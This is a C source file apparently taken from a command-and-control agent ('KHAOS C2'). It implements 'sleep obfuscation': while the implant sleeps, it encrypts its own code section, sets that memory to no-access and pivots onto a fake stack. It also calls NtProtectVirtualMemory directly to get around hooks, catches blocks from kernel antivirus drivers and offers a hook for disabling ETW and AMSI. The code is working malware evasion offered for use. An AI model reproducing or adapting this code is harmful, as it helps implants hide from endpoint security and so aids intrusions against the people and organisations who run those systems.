#include "sleep_obf.h"
#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include <stdint.h>
#include <setjmp.h>

/*
 * PoC note: this file uses GetModuleHandleA/GetProcAddress for simplicity.
 * In production, replace with a PEB walk to keep these strings off the IAT
 * and out of .rdata. See agent/src/evasion/evasion.c in KHAOS C2 for the
 * hardened version.
 */

sleep_obf_thread_hook_t g_sleep_obf_thread_hook = NULL;

typedef NTSTATUS (NTAPI *NtContinue_t)         (PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *NtWait_t)             (HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef VOID     (NTAPI *RtlCaptureContext_t)  (PCONTEXT);
typedef BOOL     (WINAPI *VirtualProtect_t)    (LPVOID, SIZE_T, DWORD, PDWORD);
typedef void     (WINAPI *Sleep_t)             (DWORD);
typedef BOOL     (WINAPI *SetEvent_t)          (HANDLE);
typedef NTSTATUS (NTAPI *NtProtectVM_t)        (HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

#define FAKE_STACK_SZ 0x10000

typedef struct {
    LPVOID              text_base;
    SIZE_T              text_size;
    BYTE                key[32];
    DWORD               sleep_ms;
    HANDLE              done;
    NtContinue_t        ntcontinue;
    LARGE_INTEGER       timeout;
    LPVOID              fake_stack_mem;
    PVOID               orig_stack_base;
    PVOID               orig_stack_limit;
    VirtualProtect_t    fn_vprot;
    Sleep_t             fn_sleep;
    SetEvent_t          fn_setevent;
} obf_ctx_t;

/* NtProtectVirtualMemory wrapper — bypasses VirtualProtect hooks.
 * Uses setjmp/VEH to catch exceptions injected by kernel-mode AV drivers
 * (e.g. Kaspersky) that block .text permission changes at kernel level.
 * On such systems the roundtrip check fails gracefully and sleep_obf
 * falls back to plain Sleep(). */
static NtProtectVM_t s_ntpvm  = NULL;
static jmp_buf       s_prot_jmp;
static volatile LONG s_in_prot = 0;

static LONG WINAPI _prot_veh(EXCEPTION_POINTERS *ep)
{
    if (!s_in_prot) return EXCEPTION_CONTINUE_SEARCH;
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION ||
        ep->ExceptionRecord->ExceptionCode == 0xC0000022) {
        longjmp(s_prot_jmp, 1);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL _nt_prot(LPVOID addr, SIZE_T sz, DWORD prot, DWORD *old)
{
    if (!s_ntpvm) {
        s_ntpvm = (NtProtectVM_t)(void *)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    }
    if (!s_ntpvm) return FALSE;

    PVOID veh = AddVectoredExceptionHandler(1, _prot_veh);
    InterlockedExchange(&s_in_prot, 1);

    if (setjmp(s_prot_jmp) != 0) {
        /* exception caught — NtPVM blocked by kernel AV driver */
        InterlockedExchange(&s_in_prot, 0);
        if (veh) RemoveVectoredExceptionHandler(veh);
        return FALSE;
    }

    PVOID  base = addr;
    SIZE_T rsz  = sz;
    ULONG  _old = 0;
    NTSTATUS st = s_ntpvm((HANDLE)(LONG_PTR)-1, &base, &rsz, (ULONG)prot, &_old);

    InterlockedExchange(&s_in_prot, 0);
    if (veh) RemoveVectoredExceptionHandler(veh);

    if (st != 0) return FALSE;
    if (old) *old = (DWORD)_old;
    return TRUE;
}

/* Read/write TEB fields via GS segment register */
__attribute__((section(".run")))
static inline PVOID _teb_read_ptr(DWORD64 off)
{
    PVOID v;
    __asm__ __volatile__("movq %%gs:(%1), %0" : "=r"(v) : "r"(off));
    return v;
}

__attribute__((section(".run")))
static inline void _teb_write_ptr(DWORD64 off, PVOID val)
{
    __asm__ __volatile__("movq %0, %%gs:(%1)" :: "r"(val), "r"(off) : "memory");
}

/* Globals shared between main thread and trampoline */
static CONTEXT        s_saved_ctx = {0};
static obf_ctx_t     *s_obf_ctx   = NULL;
static volatile LONG  s_restore   = 0;

/*
 * Timer thread: lives entirely in .run so it keeps executing while .text
 * is PAGE_NOACCESS. Uses direct function pointers stored in obf_ctx_t, not
 * IAT thunks (which sit in .text and would fault on access).
 */
__attribute__((section(".run"), noinline))
static DWORD WINAPI _timer_thread(LPVOID arg)
{
    obf_ctx_t *c = (obf_ctx_t *)arg;
    c->fn_sleep(c->sleep_ms);
    c->fn_setevent(c->done);
    return 0;
}

/*
 * Wakeup trampoline: called when NtWaitForSingleObject returns via the fake
 * stack. Decrypts .text, restores TEB stack bounds, and resumes via NtContinue
 * with the real saved context.
 */
__attribute__((section(".run"), noinline))
static void _sleep_trampoline(void)
{
    obf_ctx_t *c = s_obf_ctx;
    BYTE      *p = (BYTE *)c->text_base;
    SIZE_T     n = c->text_size;
    DWORD      old;

    c->fn_vprot(p, n, PAGE_READWRITE, &old);
    for (SIZE_T i = 0; i < n; i++) p[i] ^= c->key[i & 31];
    if (!c->fn_vprot(p, n, PAGE_EXECUTE_READ, &old))
        c->fn_vprot(p, n, PAGE_EXECUTE_READWRITE, &old);

    _teb_write_ptr(0x08, c->orig_stack_base);
    _teb_write_ptr(0x10, c->orig_stack_limit);

    c->ntcontinue(&s_saved_ctx, FALSE);
    __builtin_unreachable();
}

/*
 * Encrypt .text, mark PAGE_NOACCESS, rewrite TEB stack bounds to the fake
 * stack, then pivot to NtWaitForSingleObject via NtContinue. Never returns.
 */
__attribute__((section(".run"), noinline))
static void _obf_sleep_tail(obf_ctx_t *ctx, CONTEXT *fake_ctx_ptr)
{
    BYTE  *p = (BYTE *)ctx->text_base;
    SIZE_T n = ctx->text_size;
    DWORD  old;

    for (SIZE_T i = 0; i < n; i++) p[i] ^= ctx->key[i & 31];
    ctx->fn_vprot(p, n, PAGE_NOACCESS, &old);

    _teb_write_ptr(0x08, (PVOID)((BYTE *)ctx->fake_stack_mem + FAKE_STACK_SZ));
    _teb_write_ptr(0x10, ctx->fake_stack_mem);

    ctx->ntcontinue(fake_ctx_ptr, FALSE);
    __builtin_unreachable();
}

/* PE header walk to find own .text section */
static void _find_section(const char *name, LPVOID *base, SIZE_T *sz)
{
    *base = NULL; *sz = 0;
    BYTE *img = (BYTE *)GetModuleHandleA(NULL);
    if (!img) return;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        int ok = 1;
        for (int j = 0; j < 8; j++) {
            char c = name[j];
            if (sec->Name[j] != (unsigned char)c) { ok = 0; break; }
            if (!c) break;
        }
        if (ok) {
            *base = img + sec->VirtualAddress;
            *sz   = sec->Misc.VirtualSize;
            return;
        }
    }
}

void sleep_obf(DWORD ms)
{
    LPVOID text_base = NULL;
    SIZE_T text_size = 0;
    _find_section(".text", &text_base, &text_size);
    if (!text_base || !text_size) { Sleep(ms); return; }

    HMODULE hntdll = GetModuleHandleA("ntdll.dll");
    HMODULE hk32   = GetModuleHandleA("kernel32.dll");
    if (!hntdll || !hk32) { Sleep(ms); return; }

    NtContinue_t       fn_cont  = (NtContinue_t)      GetProcAddress(hntdll, "NtContinue");
    NtWait_t           fn_wait  = (NtWait_t)           GetProcAddress(hntdll, "NtWaitForSingleObject");
    RtlCaptureContext_t fn_cap  = (RtlCaptureContext_t)GetProcAddress(hntdll, "RtlCaptureContext");
    PVOID fn_rts                =                       GetProcAddress(hntdll, "RtlUserThreadStart");

    VirtualProtect_t fn_vprot   = (VirtualProtect_t)   GetProcAddress(hk32, "VirtualProtect");
    Sleep_t          fn_sleep   = (Sleep_t)             GetProcAddress(hk32, "Sleep");
    SetEvent_t       fn_setevent= (SetEvent_t)          GetProcAddress(hk32, "SetEvent");

    if (!fn_cont || !fn_wait || !fn_cap || !fn_vprot || !fn_sleep || !fn_setevent) {
        Sleep(ms); return;
    }

    obf_ctx_t *ctx = (obf_ctx_t *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(obf_ctx_t));
    if (!ctx) { Sleep(ms); return; }

    ctx->text_base    = text_base;
    ctx->text_size    = text_size;
    ctx->sleep_ms     = ms;
    ctx->ntcontinue   = fn_cont;
    ctx->fn_vprot     = fn_vprot;
    ctx->fn_sleep     = fn_sleep;
    ctx->fn_setevent  = fn_setevent;
    ctx->done         = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx->done) { HeapFree(GetProcessHeap(), 0, ctx); Sleep(ms); return; }

    /* relative timeout in 100ns units with 5s buffer */
    ctx->timeout.QuadPart = -((LONGLONG)(ms + 5000) * 10000LL);

    BCryptGenRandom(NULL, ctx->key, sizeof(ctx->key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    ctx->fake_stack_mem = VirtualAlloc(NULL, FAKE_STACK_SZ,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ctx->fake_stack_mem) {
        CloseHandle(ctx->done);
        HeapFree(GetProcessHeap(), 0, ctx);
        Sleep(ms);
        return;
    }

    /* place trampoline as return address on fake stack top */
    PVOID *fake_top = (PVOID *)((BYTE *)ctx->fake_stack_mem + FAKE_STACK_SZ - 16);
    fake_top[0] = (PVOID)_sleep_trampoline;
    fake_top[1] = fn_rts ? (PVOID)((BYTE *)fn_rts + 0x10) : NULL;

    ctx->orig_stack_base  = _teb_read_ptr(0x08);
    ctx->orig_stack_limit = _teb_read_ptr(0x10);

    s_obf_ctx = ctx;
    InterlockedExchange(&s_restore, 0);

    /* capture current context — RIP lands here after NtContinue restores it */
    fn_cap(&s_saved_ctx);

    /* two-pass: encrypt path sets s_restore=1; restore path sees it and cleans up */
    if (InterlockedCompareExchange(&s_restore, 0, 1) == 1) {
        SecureZeroMemory(ctx->key, sizeof(ctx->key));
        CloseHandle(ctx->done);
        VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, ctx);
        return;
    }
    InterlockedExchange(&s_restore, 1);

    /* build fake context: RIP=NtWait, RSP=fake_stack */
    CONTEXT fake_ctx;
    memcpy(&fake_ctx, &s_saved_ctx, sizeof(CONTEXT));
    fake_ctx.Rsp = (DWORD64)(uintptr_t)fake_top;
    fake_ctx.Rip = (DWORD64)(uintptr_t)fn_wait;
    fake_ctx.Rcx = (DWORD64)ctx->done;
    fake_ctx.Rdx = FALSE;
    fake_ctx.R8  = (DWORD64)(uintptr_t)&ctx->timeout;

    /* create timer thread before encrypting — DLL_THREAD_ATTACH needs .text */
    HANDLE ht = CreateThread(NULL, 0, _timer_thread, ctx, 0, NULL);
    if (!ht) {
        SecureZeroMemory(ctx->key, sizeof(ctx->key));
        CloseHandle(ctx->done);
        VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, ctx);
        InterlockedExchange(&s_restore, 0);
        Sleep(ms);
        return;
    }

    /* optional hook: arm ETW/AMSI breakpoints on the timer thread */
    if (g_sleep_obf_thread_hook)
        g_sleep_obf_thread_hook(ht);

    CloseHandle(ht);

    /* verify permission round-trip before committing (fails under ACG) */
    BYTE  *p = (BYTE *)text_base;
    DWORD  old, dummy;
    if (!_nt_prot(p, text_size, PAGE_READWRITE, &old))
        goto _fallback;
    if (!_nt_prot(p, text_size, old, &dummy)) {
        _nt_prot(p, text_size, old, &dummy);
        goto _fallback;
    }
    _nt_prot(p, text_size, PAGE_READWRITE, &old);

    _obf_sleep_tail(ctx, &fake_ctx);
    __builtin_unreachable();

_fallback:
    SecureZeroMemory(ctx->key, sizeof(ctx->key));
    CloseHandle(ctx->done);
    VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, ctx);
    InterlockedExchange(&s_restore, 0);
    Sleep(ms);
}
